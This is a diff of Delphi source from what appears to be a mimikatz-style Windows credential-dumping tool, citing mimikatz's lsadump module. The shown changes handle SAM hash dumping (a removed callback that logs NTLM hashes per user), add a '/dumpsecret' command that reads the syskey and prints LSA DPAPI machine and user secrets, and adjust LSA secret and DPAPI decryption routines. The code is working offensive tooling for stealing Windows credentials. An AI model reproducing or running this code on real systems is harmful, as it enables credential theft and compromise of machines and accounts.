@@ -300,6 +300,11 @@ end;
 
 
 
+
+//https://blog.3or.de/mimikatz-deep-dive-on-lsadumplsa-patch-and-inject.html
+//https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kuhl_m_lsadump.c#L971
+function dumpsam(pid:dword;user:string):boolean;
+//*****************************************************
 function Init_Int_User_Info:tbytes;
 const
 PTRN_WALL_SampQueryInformationUserInternal:array[0..3] of byte=($49, $8d, $41, $20);
@@ -320,10 +325,7 @@ begin
      end;
 result:=pattern;
 end;
-
-//https://blog.3or.de/mimikatz-deep-dive-on-lsadumplsa-patch-and-inject.html
-//https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kuhl_m_lsadump.c#L971
-function dumpsam(pid:dword;user:string):boolean;
+//*****************************************************
 const
 //offset x64
 WIN_BUILD_2K3:ShortInt=	-17; //need a nop nop
@@ -836,24 +838,7 @@ ZeroMemory(@StartupInfo, SizeOf(TStartupInfoW));
   log('createprocessaspid failed,'+inttostr(getlasterror),1)
 end;
 
-function callback_SamUsers(param:pointer=nil):dword;stdcall;
-var
-  bytes:tbyte16;
-  username:string;
-begin
-  try
-  fillchar(bytes,sizeof(bytes),0);
-  if dumphash(psamuser(param).samkey,psamuser(param).rid,bytes,username)
-          then log('NTHASH:'+username+':'+inttostr(psamuser(param).rid)+'::'+ByteToHexaString(bytes) ,1)
-          else log('gethash NOT OK for '+inttohex(psamuser(param).rid,8)+':'+username ,1);
-  except
-    on e:exception do
-    begin
-      if e.ClassName ='EAccessViolation' then log('NTHASH:'+username+':'+inttostr(psamuser(param).rid)+'::'+ByteToHexaString(bytes) ,1);
-      log(e.Message ,0); //SHAME!!!!!!!!!!!!!!
-    end;
-  end;
-end;
+
 
 function callback_LogonPasswords(param:pointer=nil):dword;stdcall;
 var
@@ -1093,7 +1078,6 @@ begin
      else writeln(BytetoAnsiString (buffer));
   //writeln(BytetoAnsiString (buffer)+'.');
   }
-  //exit;
   //
   p:=pos('/enumcred2',cmdline);
   if p>0 then
@@ -1612,11 +1596,22 @@ p:=pos('/enumts',cmdline); //can be done with taskkill
    goto fin;
    end;
   //****************************************************
+  p:=pos('/dumpsecret',cmdline);
+  if p>0 then
+     begin
+     if getsyskey(syskey) then
+      if dumpsecret(syskey,output_) then
+       begin
+       log('Full:'+ByteToHexaString (@output_ [4],length(output_)-4),1);
+       log('Machine:'+ByteToHexaString (@output_ [4],(length(output_)-4) div 2),1);
+       log('User:'+ByteToHexaString (@output_ [4+(length(output_)-4) div 2],(length(output_)-4) div 2),1);
+       end;
+     end;
   p:=pos('/getlsasecret',cmdline);
   if p>0 then
      begin
      if input='' then exit;
-     if lsasecrets(input,output_)=false
+     if lsasecret(input,output_)=false
         then log('lsasecrets failed',1)
         else log(ByteToHexaString (output_),1);
      goto fin;
@@ -1625,7 +1620,7 @@ p:=pos('/enumts',cmdline); //can be done with taskkill
   if p>0 then
      begin
      input:='dpapi_system';
-     if lsasecrets(input,output_)=false
+     if lsasecret(input,output_)=false
         then log('lsasecrets failed',1)
         else
         begin
@@ -1642,18 +1637,20 @@ p:=pos('/enumts',cmdline); //can be done with taskkill
   if p>0 then
      begin
      if (input='') and (binary='') then exit;
-     if binary <>'' then if CryptUnProtectData_(binary,buffer)=false
+     if binary <>'' then if CryptUnProtectData_(binary,output_)=false
          then log('CryptUnProtectData_ NOT OK',1)
-         else log('Decrypted:'+BytetoAnsiString (buffer),1);
-     if input <>'' then if CryptUnProtectData_(HexaStringToByte2 (input) ,buffer)=false
+         else log('Decrypted:'+BytetoAnsiString (output_),1);
+     if input <>'' then if CryptUnProtectData_(HexaStringToByte2 (input) ,output_)=false
          then log('CryptUnProtectData_ NOT OK',1)
-         else log('Decrypted:'+BytetoAnsiString (buffer),1);
+         else log('Decrypted:'+BytetoAnsiString (output_),1);
      end;
   p:=pos('/cryptprotectdata',cmdline);
   if p>0 then
      begin
      if input='' then exit;
-      if CryptProtectData_(AnsiStringtoByte (input) ,'encrypted.blob')=false
+     dw:=0;
+     if mode='MACHINE' then dw:=4; //CRYPTPROTECT_LOCAL_MACHINE
+      if CryptProtectData_(AnsiStringtoByte (input) ,'encrypted.blob',dw)=false
          then log('CryptUnProtectData_ NOT OK',1)
          else log('CryptUnProtectData_ OK - written : encrypted.blob',1);
      end;
